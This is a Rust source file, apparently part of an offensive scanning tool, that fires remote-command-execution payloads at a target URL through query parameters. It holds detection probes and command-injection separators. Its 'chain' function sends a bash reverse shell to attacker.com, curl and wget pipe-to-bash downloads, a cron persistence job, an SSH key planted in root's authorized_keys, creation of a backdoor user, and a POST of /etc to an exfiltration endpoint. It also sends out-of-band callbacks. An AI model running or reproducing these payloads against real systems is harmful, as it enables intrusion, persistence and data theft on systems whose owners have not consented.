use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn detect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} RCE Vulnerability Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let detection_payloads = [
        ("Linux id", "id", "uid=", "gid="),
        ("Linux whoami", "whoami", "root", "www-data"),
        ("Linux uname", "uname -a", "Linux", "GNU"),
        ("Windows whoami", "whoami", "nt authority", "administrator"),
        ("Windows ver", "ver", "Microsoft", "Windows"),
        (
            "Python exec",
            "__import__('os').system('id')",
            "uid=",
            "gid=",
        ),
        (
            "Node exec",
            "require('child_process').execSync('id')",
            "uid=",
            "gid=",
        ),
        ("PHP exec", "system('id')", "uid=", "gid="),
    ];

    for (name, cmd, marker1, marker2) in &detection_payloads {
        let params = [
            format!("{}cmd={}", url, cmd),
            format!("{}exec={}", url, cmd),
            format!("{}command={}", url, cmd),
            format!("{}run={}", url, cmd),
            format!("{}q={}", url, cmd),
        ];
        for target in &params {
            if let Ok(r) = client.get(target).send().await {
                let text = r.text().await.unwrap_or_default();
                if text.contains(marker1) || text.contains(marker2) {
                    println!("  {} {:20} — RCE DETECTED", "[!]".red().bold(), name);
                    break;
                }
            }
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} RCE Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Semicolon", "; id"),
        ("Pipe", "| id"),
        ("Ampersand", "& id"),
        ("Double amp", "&& id"),
        ("Double pipe", "|| id"),
        ("Subshell", "$(id)"),
        ("Backtick", "`id`"),
        ("Newline", "\nid"),
        ("Null byte", "\x00id"),
        ("Dollar brace", "${IFS}id"),
    ];

    for (name, payload) in &payloads {
        let target = format!("{}cmd={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if text.contains("uid=") || text.contains("gid=") {
                    println!("  {} {:20} — EXECUTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn chain(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} RCE Chain Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let chain_payloads = [
        (
            "Reverse shell",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        ),
        ("File write", "echo 'hacked' > /tmp/pwned.txt"),
        ("Curl exec", "curl http://attacker.com/shell.sh | bash"),
        (
            "Wget exec",
            "wget http://attacker.com/shell.sh -O /tmp/sh.sh && bash /tmp/sh.sh",
        ),
        (
            "Cron job",
            "(crontab -l; echo '* * * * * curl http://attacker.com/ping') | crontab -",
        ),
        (
            "SSH key",
            "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
        ),
        (
            "User add",
            "useradd -m -s /bin/bash attacker && echo 'attacker:pass' | chpasswd",
        ),
        (
            "Data exfil",
            "tar czf - /etc | curl -X POST -d @- http://attacker.com/exfil",
        ),
    ];

    for (name, payload) in &chain_payloads {
        let target = format!("{}cmd={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20} — SENT", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn oob(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} RCE Out-of-Band Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let oob_payloads = [
        ("DNS OOB", "nslookup attacker.com"),
        ("Curl OOB", "curl http://attacker.com/oob"),
        ("Wget OOB", "wget http://attacker.com/oob"),
        ("Ping OOB", "ping -c 1 attacker.com"),
        ("Dig OOB", "dig attacker.com"),
        (
            "Python OOB",
            "python -c 'import urllib;urllib.urlopen(\"http://attacker.com/oob\")'",
        ),
        (
            "Perl OOB",
            "perl -e 'use LWP::Simple; get(\"http://attacker.com/oob\")'",
        ),
        (
            "PowerShell OOB",
            "powershell -c 'Invoke-WebRequest http://attacker.com/oob'",
        ),
    ];

    for (name, payload) in &oob_payloads {
        let target = format!("{}cmd={}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                println!(
                    "  {} {:20} — status={} (check callback server)",
                    "*".cyan(),
                    name,
                    status
                );
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    println!(
        "\n  {} Monitor your callback server for incoming requests",
        "[*]".cyan().bold()
    );

    Ok(())
}
